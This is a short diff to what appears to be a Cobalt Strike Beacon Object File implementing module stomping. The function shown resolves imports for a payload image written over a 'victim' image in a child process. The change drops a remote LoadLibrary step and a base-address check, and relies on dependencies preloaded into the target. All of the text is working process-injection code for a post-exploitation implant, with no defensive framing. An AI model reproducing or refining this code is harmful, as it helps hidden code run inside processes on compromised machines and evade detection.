@@ -667,9 +667,9 @@ static BOOL PpfStompPreloadDeps(HANDLE hProcess)
 }
 
 /*
- * Fill IAT using agent-side GetProcAddress (system DLL bases match the child)
- * after ensuring each DLL is loaded in the child. Avoids remote GPA stubs and
- * avoids LoadLibrary after the victim image has been overwritten.
+ * Fill IAT with agent-side GetProcAddress addresses. System DLL bases match
+ * across processes; deps were already LoadLibraryEx'd into the child during
+ * preload. No remote LoadLibrary here (short-name stubs were failing).
  */
 static BOOL PpfStompResolveImports(
     HANDLE hProcess,
@@ -696,7 +696,6 @@ static BOOL PpfStompResolveImports(
         IMAGE_IMPORT_DESCRIPTOR imp;
         DWORD nameOff;
         char dllName[128];
-        ULONG_PTR remoteMod = 0;
         HMODULE localMod = NULL;
         DWORD oftRva;
         DWORD ftRva;
@@ -738,23 +737,6 @@ static BOOL PpfStompResolveImports(
                 "[!] stomp: local LoadLibrary(%s) failed (err=%lu)",
                 dllName,
                 KERNEL32$GetLastError());
-            return FALSE;
-        }
-
-        if (!PpfStompRemoteLoadLibraryA(hProcess, dllName, &remoteMod)) {
-            BeaconPrintf(
-                CALLBACK_ERROR,
-                "[!] stomp: remote LoadLibrary(%s) failed",
-                dllName);
-            return FALSE;
-        }
-        if (remoteMod != (ULONG_PTR)localMod) {
-            BeaconPrintf(
-                CALLBACK_ERROR,
-                "[!] stomp: %s base mismatch local=%p remote=%p",
-                dllName,
-                (void*)localMod,
-                (void*)remoteMod);
             return FALSE;
         }
 
